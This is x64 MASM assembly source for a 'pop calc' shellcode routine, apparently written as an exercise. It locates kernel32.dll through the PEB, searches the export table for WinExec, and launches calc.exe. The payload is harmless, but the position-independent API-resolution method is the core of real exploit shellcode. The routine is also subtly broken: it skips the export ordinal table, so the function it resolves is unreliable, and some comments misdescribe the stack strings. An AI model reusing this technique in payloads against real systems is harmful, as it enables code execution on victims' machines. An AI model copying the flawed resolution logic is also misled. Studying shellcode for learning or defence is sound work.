
.code

	pop_calc_shellcode PROC PUBLIC
	
			push rbp 
			mov rbp, rsp
			sub rsp, 90h    ; Set some space for variables


			;; According to https://www.wikiwand.com/en/Win32_Thread_Information_Block
			;;  GS:[0x30] returns the Linear adress of TEB
			;;	In fact, we can even use GS:[0x60] to get the linear address of PEB but for this 
			;;	exercise, let's just find PEB from TEB.

			xor rax, rax
			mov rax, qword ptr gs:[00000030h] ; TEB 

			;; Getting the PEB from TEB
			mov rax, qword ptr [rax + 60h] ; PEB

			; Ldr at offset 0x18
			mov rax, qword ptr [rax + 18h] ; _PEB_LDR_DATA
			
			; In Memory Order Module List (_LIST_ENTRY)
			mov rax, qword ptr [rax + 20h] ; InMemoryOrderModuleList
			mov rax, [rax]; next flink 
			mov rax, [rax]; next flink ; this should be kernel32.dll
			lea rax,  [rax-10h] ; _LDR_DATA_TABLE_ENTRY

			mov rax, qword ptr[rax+30h] ; RAX = The Dll base with MZ Signature

			;; Look for New Exe Header
			xor rbx, rbx					; clear just in case the upper 32 bits contains something
			mov ebx, dword ptr [rax + 3ch]	; Get offset of new Exe header 
			add rbx, rax					; offset + Image Base (Virtual Address)
			

			;; Get the RVA for Export Directory at offset 0x88 from the EXE header
			add rbx, 88h  ;  address to RVA for Export Directory at offset 0x88 from the EXE header
			

			xor rcx, rcx
			mov ecx, dword ptr [rbx]		; Get RVA of Export Directory
			add rcx, rax					;  RCX = Virtual Address of Export Directory
			mov qword ptr [rbp-90h], rcx	; <------------- Virtual Address of Export Directory

			

			xor rdx, rdx
			mov edx, dword ptr [rcx + 1ch]   ; RVA of Function table
			add rdx, rax                     ; Virtual Address of Function Table
			mov qword ptr [rbp-70h], rdx     ; <----------Virtual Address of function Table
			
			xor rbx, rbx
			mov edx, dword ptr [rcx + 20h]   ; RVA of Name Table
			add rdx, rax					 ; Virtual Address of Name Table
			mov qword ptr [rbp-60h], rdx     ; <----------- Virtual Address of Name Table

			xor rcx, rcx ; free up rcx just because i prefer the rcx to be used as a counter variable
			xor rdx, rdx

			

			; Do String Comparison
			; We want to start from the Function Name table	which contains RVA to function name. 
			; Each RVA has length of DWORD which means 4 bytes. 
			; To check the string, we can have to get every 4 bytes from the Function Name table
			; then add it to the base address to get the Virtual address. 
			; Do string compare with cmpsb instruction to compare the string bytes with prefix repe
			; See more about the string comparison in https://faydoc.tripod.com/cpu/repe.htm
			; and https://faydoc.tripod.com/cpu/cmps.htm
			; cmpsb Compares byte at address DS:(E)SI with byte at address ES:(E)DI and sets the status flags accordingly

			push rcx ; String terminator
			mov rcx, 636578456e6957FFh		; WinExec string with FF which we will shift to fill in space
			shr rcx, 8
			push rcx						; Push the string value onto the stack
			push rsp						; stack address to targeted function name "WinExec"

			xor rcx, rcx			
			mov cl, 07h;; length of the string "WinExec"
			push rcx
			;; push then pop like that so it is easier to see the registers and usage
			pop r8							; <----- Function Length and the counter
			pop r9							; <----- String Address to WinExec string
			xor r12, r12					; <----- ordinal
			

			IterateAndCompareFunctionName:

				mov rcx, r8							; act as counter for the loop - re-update since rcx is decremented
				mov rsi, r9							; putting the WinExec String pointer to the source register for repe cmpsb part
				mov rdx, qword ptr [rbp-60h]		; Virtual Address of Name Table
				mov edx, dword ptr [rdx + r12*4]	; RVA of nth string and *4 because that is the size of RVA in the name table 
				inc r12								; increment the ordinal value
				lea r11, [rdx+ rax]					; Virtual Address of first string  (RVA + Base Address)
				mov rdi, r11						; Move that virtual address to destination register for repe cmpsb part
				repe cmpsb							; compare the two strings between source and destination register for rcx number of bytes
				jne IterateAndCompareFunctionName   ; jne if mismatch

			;; At this point, we have found the ordinal value for "WinExec"
			
			add rsp, 10h     ; do stack house keeping ( remember we pushed the string on to the stack )

			; Ordinal value stored in r12


			;; Now, the function address table contains the RVA (DWORD) to the function address, we can use the 
			;; In Pseudocode, we want to see this
			;; DWORD RVA = *(DWORD*)((BYTE*)&functionAddressTable + (ordinal-1)*sizeof(DWORD))
			;; We decrease ordinal value by 1 since ordinal starts at 1 but offset starts at 0
			;; in the function address table

			dec r12							; (ordinal-1)
			xor rdi, rdi
			xor rdx, rdx
			mov dl, 04h
			add rdi, rdx						; size of dword

			push rax						; preserve the dll base address
			mov rax, rdi					; store rax to mulitply with (sizeof(DWORD))
			mov rsi, r12					; (ordinal-1)
			imul rsi						; (ordinal-1)*sizeof(DWORD)		
			mov rsi, rax					; rsi = (ordinal-1)*sizeof(DWORD)
			pop rax							; restore the base address for calculation of virtual address
			
			mov rdi, qword ptr [rbp-70h]	; Virtual Address of Function Address Table
			lea rdi, [rdi + rsi]			; (DWORD*)((BYTE*)&functionAddressTable + (ordinal-1)*sizeof(DWORD))
			mov edi, dword ptr [rdi]		; Dereference to get the RVA of the "WinExec" function"
			add rdi, rax					; Get Virtual Address of WinExec by adding Dll base address


			;; Now address of WinExec is in rdi
			;; Write string of calc.exe into the stack and get the stack pointer before calling 

			mov rbx, 6578652e41414141h  ; exe.AAAA
			shr rbx, 32                 ;  ".exe\x00\x00\x00\x00"
			push rbx    
			mov rbx, 636c61635c32336dh  ; 
			push rbx
			mov rbx, 65747379735c7377h  ; \sw
			push rbx
			mov rbx, 6f646e69575c3a43h  ; odniW\:C
			push rbx                        
			push rsp  ; Push the stackpointer pointing to the calc.exe string

			pop rcx   ; pass in as first argumnent
			inc rdx   ; SW_SHOWNORMAL as second argument
			sub rsp, 20h   ; Avoid messing with stack for the top 0x20 bytes
			call rdi  ; Call WinExec
			
			

	pop_calc_shellcode ENDP

end